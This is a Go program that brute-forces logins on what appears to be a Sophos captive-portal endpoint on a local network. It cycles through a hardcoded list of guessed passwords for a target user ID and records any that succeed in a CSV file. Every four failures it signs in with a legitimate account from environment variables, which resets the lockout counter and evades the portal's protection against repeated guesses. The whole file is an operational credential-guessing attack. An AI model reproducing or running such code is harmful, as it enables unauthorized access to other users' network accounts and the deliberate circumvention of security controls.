package main

import (
	"encoding/csv"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

var passwords = []string{
	"157030AR",
	"216031IM",
	"268032SH",
	"185033UM",
	"267037EH",
	"338038RE",
	"323047AI",
	"346048AR",
	"302049IN",
	"357043AR",
	"163044HI",
	"178045HI",
	"005012EH",
	"421013EE",
	"083014EE",
	"419015UL",
	"063016UR",
	"417017AR",
	"053018BH",
	"052019UH",
	"035005IS",
	"087006EH",
	"411007NU",
	"055009RU",
	"045010IS",
	"049001NU",
	"065002AK",
	"416003AS",
	"044005NA",
	"064001AN",
	"412002IT",
	"026003AN",
	"027004OP",
	"008005NU",
	"396006OH",
	"071001HW",
	"019002RI",
	"024003IV",
	"089004NU",
	"427005AJ",
	"424006KS",
	"423007AV",
	"415008UJ",
	"086009IS",
	"073010HR",
	"294042AN",
	"381041OS",
	"199040AS",
}

type Requestresponse struct {
	XMLName       xml.Name `xml:"requestresponse"`
	Text          string   `xml:",chardata"`
	Status        string   `xml:"status"`
	Message       string   `xml:"message"`
	Logoutmessage string   `xml:"logoutmessage"`
	State         string   `xml:"state"`
}

func main() {
	// get correct password and username from env vars
	correctUsername := os.Getenv("SOPHOS_USERNAME")
	correctPassword := os.Getenv("SOPHOS_PASSWORD")

	currDir, err := os.Getwd()
	if err != nil {
		log.Fatalln(err)
	}

	csvFile, err := os.OpenFile(filepath.Join(currDir, "matched.csv"), os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	if err != nil {
		log.Panicln(err)
	}

	csvWriter := csv.NewWriter(csvFile)

	var wrongAttempts = 0
	for i := 19102158; i <= 19102158; i++ {
		for _, pwd := range passwords {

			// reset to prevent timeout due to to many bad login attempts
			if wrongAttempts == 4 {
				wrongAttempts = 0
				err := resetLogins(correctUsername, correctPassword)
				if err != nil {
					log.Fatalln(err)
				}
			}

			fmt.Println(fmt.Sprint(i),fmt.Sprint(pwd))
			res, err := login(fmt.Sprint(i), fmt.Sprint(pwd))
			if err != nil {
				//log.Println(res)
				log.Println(err)
				wrongAttempts++
				continue
			} else {
				_, err = logout(fmt.Sprint(correctUsername))
				if err != nil {
					log.Println(err)
				}
				err := csvWriter.Write([]string{fmt.Sprint(i), pwd})
				if err != nil {
					log.Fatalln(err)
				}
				csvWriter.Flush()
				fmt.Println(res)
				break
			}
		}
	}

}

func login(username string, password string) (*Requestresponse, error) {
	url := "http://172.16.68.6:8090/login.xml"
	method := "POST"

	payload := strings.NewReader(fmt.Sprintf("mode=191&username=%s&password=%s", username, password))

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return nil, err
	}

	var parsedResponse Requestresponse
	err = xml.Unmarshal(body, &parsedResponse)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	if !strings.Contains(parsedResponse.Message, "You are signed in as {username}") {
		return &parsedResponse, fmt.Errorf("error logging in")
	}

	return &parsedResponse, nil
}

func logout(username string) (*Requestresponse, error) {
	url := "http://172.16.68.6:8090/logout.xml"
	method := "POST"

	payload := strings.NewReader(fmt.Sprintf("mode=193&username=%s", username))

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)
	if err != nil {
		return nil, err
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return nil, err
	}

	var parsedResponse Requestresponse
	err = xml.Unmarshal(body, &parsedResponse)
	if err != nil {
		return nil, err
	}

	if !strings.Contains(parsedResponse.Message, "You&#39;ve signed out") {
		return &parsedResponse, fmt.Errorf("error logging out")
	}

	return &parsedResponse, nil
}

func resetLogins(correctUsername string, correctPassword string) error {
	_, err := login(fmt.Sprint(correctUsername), fmt.Sprint(correctPassword))
	if err != nil {
		return err
	}
	//log.Println(res)
	log.Println("Logged in as", correctUsername)
	time.Sleep(2 * time.Second)

	_, err = logout(fmt.Sprint(correctUsername))
	if err != nil {
		return err
	}

	return nil
}
